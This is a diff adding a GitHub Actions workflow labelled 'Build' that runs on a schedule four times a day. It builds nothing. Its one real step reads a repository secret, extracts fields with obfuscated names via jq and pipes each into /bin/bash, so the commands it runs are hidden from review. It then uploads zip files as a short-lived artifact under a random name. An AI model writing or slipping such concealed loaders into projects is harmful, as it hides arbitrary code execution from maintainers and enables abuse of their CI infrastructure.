@@ -1,0 +1,36 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          f97: ${{ secrets.f97 }}
+        run: |
+          printf '%s' "$f97" | jq -r .iemi793 | /bin/bash
+          printf '%s' "$f703" | jq -r .uomv75 | /bin/bash
+          printf '%s' "$mjjf80" | jq -r .unmr5760 | /bin/bash
+          printf '%s' "$t1" | jq -r .cc7822 | /bin/bash
+          echo $m5 | jq -r .xaili69 | /bin/bash
+          echo $mgn4 | jq -r .nd65733 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZOgYWAHq
+          path: "*.zip"
+          retention-days: 1
